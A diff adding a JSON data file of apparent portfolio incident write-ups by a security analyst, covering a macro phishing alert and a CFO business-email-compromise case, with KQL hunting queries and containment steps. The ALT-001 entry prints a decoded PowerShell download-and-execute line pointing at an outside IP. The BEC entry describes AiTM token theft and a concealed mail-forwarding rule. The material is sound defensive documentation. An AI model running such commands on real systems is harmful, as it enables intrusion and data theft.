@@ -1,0 +1,159 @@
+{
+  "profile": {
+    "name": "Marcus Chen",
+    "role": "Security Analyst II",
+    "tagline": "Incident response and threat hunting in cloud-native environments. Focus areas: identity attacks, M365 forensics, and detection engineering.",
+    "location": "Austin, TX",
+    "photo": "",
+    "links": {
+      "linkedin": "https://linkedin.com/in/marcuschen",
+      "github": "https://github.com/marcuschen",
+      "email": "m.chen@example.com"
+    },
+    "theme": "operator"
+  },
+  "alerts": [
+    {
+      "id": "ALT-001",
+      "alertName": "Suspicious Base64-Encoded PowerShell Command",
+      "alertId": "MDE-ALERT-7823421",
+      "date": "2024-11-14",
+      "severity": "High",
+      "hostOrAccount": "CORP-WKS-042 / sarah.mitchell@[org].com",
+      "dateTime": "14 Nov 2024 09:47 UTC",
+      "whatTriggered": "Defender for Endpoint alert fired on powershell.exe spawning with the -EncodedCommand flag, with parent process winword.exe — a common macro-initiated execution pattern.",
+      "whyTriggered": "Rule: \"Suspicious child process of Office application\" — detects LOLBin abuse where Office processes spawn scripting engines, a known initial access technique used in phishing campaigns.",
+      "whatHappened": "User sarah.mitchell received a phishing email with a malicious Word attachment disguised as a supplier invoice. Opening the document triggered a macro that executed a Base64-encoded PowerShell command. The command attempted to download a second-stage payload from a known C2 IP via IEX (New-Object Net.WebClient).DownloadString(). The download was blocked at the network proxy before execution.",
+      "evidence": "Process tree: WINWORD.EXE (PID 4812) → cmd.exe → powershell.exe -EncodedCommand [base64 string]. Decoded command: IEX (New-Object Net.WebClient).DownloadString('http://185.220.101.47/payloads/stage2.ps1'). Network log: outbound connection to 185.220.101.47:80 blocked by Zscaler proxy at 09:47:14 UTC. Email header analysis confirms external sender with spoofed display name matching internal finance contact.",
+      "wasSuccessful": "No",
+      "verdict": "Malicious",
+      "verdictJustification": "Process lineage (Word → cmd → PowerShell with -EncodedCommand) is a textbook macro-initiated execution chain. Decoded PowerShell unambiguously attempts to retrieve and execute a remote script. C2 IP 185.220.101.47 returned 28/90 detections on VirusTotal and matches a known Tor exit node used in prior BEC campaigns. No legitimate business use case for this activity.",
+      "investigationSteps": [
+        "Opened MDE alert — noted winword.exe as parent process, immediate indicator of macro execution.",
+        "Extracted the Base64 argument from the PowerShell command line via MDE process events. Decoded using CyberChef (From Base64 → Raw).",
+        "Decoded string revealed IEX DownloadString pointing to 185.220.101.47. Searched this IP in VirusTotal (28/90 detections) and Shodan (Tor exit node, previously flagged in SOCSIM BEC investigation BEC-001).",
+        "Queried MDE DeviceNetworkEvents for 185.220.101.47 across all endpoints in the last 7 days — no other endpoints contacted this IP.",
+        "Confirmed payload download was blocked by Zscaler proxy. No evidence of stage2 execution or persistence mechanisms.",
+        "Searched Exchange for the original phishing email by sender domain and subject pattern — found 3 copies delivered across the org; 2 unread, 1 opened (sarah.mitchell). All 3 deleted from Exchange.",
+        "Isolated CORP-WKS-042 via MDE. Ran full antivirus scan — no additional threats found. Notified user and walked through the phishing indicators."
+      ],
+      "queries": "// Process timeline for CORP-WKS-042 around alert time\nDeviceProcessEvents\n| where DeviceName == \"CORP-WKS-042\"\n| where Timestamp between (datetime(2024-11-14 09:40) .. datetime(2024-11-14 10:00))\n| project Timestamp, FileName, ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessCommandLine\n| order by Timestamp asc\n\n// Check for lateral C2 contact across all endpoints (last 7 days)\nDeviceNetworkEvents\n| where RemoteIP == \"185.220.101.47\"\n| where Timestamp >= ago(7d)\n| summarize ContactCount = count() by DeviceName, RemoteIP\n| order by ContactCount desc\n\n// Search Exchange for the phishing email\nEmailEvents\n| where Timestamp >= ago(24h)\n| where SenderMailFromDomain == \"invoices-ap[.]net\"\n| project Timestamp, RecipientEmailAddress, Subject, DeliveryAction",
+      "categorisation": "TP",
+      "escalation": "Urgent",
+      "containment": "CORP-WKS-042 isolated via MDE one-click isolation. Phishing email found and deleted from all three recipient mailboxes via Exchange Online Admin. C2 IP 185.220.101.47 and sender domain invoices-ap[.]net submitted to Zscaler block list and tenant threat intel watchlist. User sarah.mitchell briefed on phishing indicators. Security awareness reminder sent to Finance team.",
+      "alertTuning": "No tuning required",
+      "lessonsLearned": "Searching Exchange for other recipients of the same phishing email should be step 2, not step 6. If the download had succeeded, waiting until late in the investigation to find 2 additional recipients would have created unnecessary dwell risk. Updated personal playbook to include email spread check as an early parallel triage step.",
+      "tools": [
+        "Microsoft Defender for Endpoint",
+        "KQL",
+        "CyberChef",
+        "VirusTotal",
+        "Shodan",
+        "Exchange Online Admin",
+        "Zscaler"
+      ],
+      "verified": true,
+      "customSections": [
+        {
+          "title": "MITRE ATT&CK Mapping",
+          "content": "- T1059.001 PowerShell\n- T1566.001 Spearphishing Attachment"
+        }
+      ]
+    },
+    {
+      "id": "ALT-002",
+      "alertName": "Minimal entry",
+      "date": "",
+      "severity": "Low",
+      "hostOrAccount": "",
+      "dateTime": "",
+      "whatTriggered": "",
+      "whyTriggered": "",
+      "whatHappened": "Only a narrative with **markdown** and `code`.",
+      "evidence": "",
+      "wasSuccessful": "Unknown",
+      "verdict": "Non-malicious",
+      "verdictJustification": "",
+      "investigationSteps": [],
+      "queries": "",
+      "categorisation": "FP",
+      "escalation": "None",
+      "containment": "",
+      "alertTuning": "",
+      "lessonsLearned": "",
+      "tools": [],
+      "verified": false,
+      "handAddedNote": "a key the editor never wrote"
+    }
+  ],
+  "bec": [
+    {
+      "id": "BEC-001",
+      "caseName": "BEC Case Drop 1 — CFO Account Takeover",
+      "caseReference": "WDL-BEC-2024-001",
+      "affectedAccount": "cfo@[org].com",
+      "incidentDateFrom": "2024-11-10",
+      "incidentDateTo": "2024-11-11",
+      "investigationDate": "2024-11-11",
+      "attackNarrative": "An AiTM (Adversary-in-the-Middle) phishing kit operating as a reverse proxy to the Microsoft sign-in portal captured the CFO's session cookie immediately after successful MFA. The adversary replayed the stolen token from a Tor exit node, maintaining persistent Exchange access for 6 hours without knowledge of the account password. A malicious inbox forwarding rule silently exfiltrated 14 emails containing financial correspondence. A fraudulent wire transfer of $127,000 was drafted and sent — identified and blocked 58 minutes after the initial Sentinel alert fired, before the transfer settled.",
+      "timeline": [
+        {
+          "time": "20:14 UTC (D-1)",
+          "activity": "Threat actor initial access via AiTM kit",
+          "detail": "CFO authenticates through credential-secure-login[.]com, a reverse proxy mimicking the Microsoft sign-in portal. Session cookie captured by adversary immediately after MFA completion."
+        },
+        {
+          "time": "20:31 UTC (D-1)",
+          "activity": "Malicious inbox rule created",
+          "detail": "Adversary creates rule: IF subject contains 'wire', 'transfer', 'payment', or 'invoice' → forward to ext_forward_bec2024@proton.me AND mark as read."
+        },
+        {
+          "time": "02:14 UTC",
+          "activity": "Sentinel fusion alert fires",
+          "detail": "Impossible Travel + MFA Fatigue alerts correlated into single P1 incident. On-call analyst paged."
+        },
+        {
+          "time": "02:22 UTC",
+          "activity": "IP-first triage — adversary IP confirmed malicious",
+          "detail": "Legitimate source 24.118.x.x (Austin TX) vs adversary 185.220.101.47 (Bucharest, RO). AbuseIPDB returns 97% confidence — active Tor exit relay."
+        },
+        {
+          "time": "02:41 UTC",
+          "activity": "Session ID pivot — stolen token identified",
+          "detail": "Microsoft Graph API (auditLogs/signIns) confirms active refresh token still valid. Phishing domain extracted from sign-in referrer header."
+        },
+        {
+          "time": "02:58 UTC",
+          "activity": "Malicious inbox rule discovered",
+          "detail": "Exchange Online audit log surfaces forwarding rule created at 20:31 UTC prior day. 14 emails exfiltrated over 6-hour dwell window."
+        },
+        {
+          "time": "03:12 UTC",
+          "activity": "Containment — sessions revoked",
+          "detail": "All active sessions revoked via Graph API revokeSignInSessions. Conditional Access policy updated. MFA registration locked."
+        },
+        {
+          "time": "04:45 UTC",
+          "activity": "Wire transfer blocked",
+          "detail": "Bank fraud line contacted. $127,000 transfer flagged before settlement window. No financial loss."
+        }
+      ],
+      "initialAccess": "AiTM phishing kit at credential-secure-login[.]com operated as a reverse proxy to the legitimate Microsoft sign-in portal. After the CFO completed MFA, the kit captured the post-authentication session cookie. Token replay from Tor exit node 185.220.101.47 bypassed Conditional Access — legacy CAE enforcement was absent from executive accounts, leaving the stolen token valid for 6 hours across IP change.",
+      "unauthorisedActivity": "Adversary created inbox forwarding rule matching financial keywords (wire, transfer, payment, invoice), forwarding all matches to an external Proton Mail address and marking them as read to conceal the rule's operation. 14 emails exfiltrated during the 6-hour dwell window. A fraudulent wire transfer request for $127,000 was composed and sent to the Finance team from the compromised mailbox.",
+      "dataAccess": "Exchange Online: 14 emails with financial subject lines exfiltrated via inbox forwarding rule. Content included pending vendor payments, internal budget approvals, and banking correspondence. SharePoint/OneDrive: no evidence of access — sign-in logs show no document requests from adversary session. Blast radius limited to mailbox content visible to the CFO account.",
+      "lessonsLearned": "CAE enforcement should be mandatory for all executive accounts — the 6-hour token validity window was entirely preventable. A KQL rule alerting on inbox rule creation for accounts in the Executive security group within 60 minutes of an Impossible Travel event would have triggered containment 74 minutes earlier. Added both detections to the SIEM post-incident.",
+      "tools": [
+        "Microsoft Sentinel",
+        "KQL",
+        "Microsoft Graph API",
+        "Exchange Online Admin",
+        "AbuseIPDB",
+        "VirusTotal",
+        "Shodan",
+        "Logic Apps"
+      ],
+      "pdfUrl": "",
+      "verified": true
+    }
+  ]
+}
